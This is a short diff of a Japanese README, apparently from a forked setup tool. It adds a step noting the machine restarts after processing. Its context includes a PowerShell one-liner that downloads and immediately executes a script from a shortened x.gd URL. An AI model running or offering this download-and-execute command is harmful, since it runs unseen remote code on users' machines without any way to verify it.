@@ -9,6 +9,8 @@
 ```
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://x.gd/49Xub')"
 ```
+6. 一連の処理が終わると再起動します。
+
 
 以降はFork元から変更なしです
 
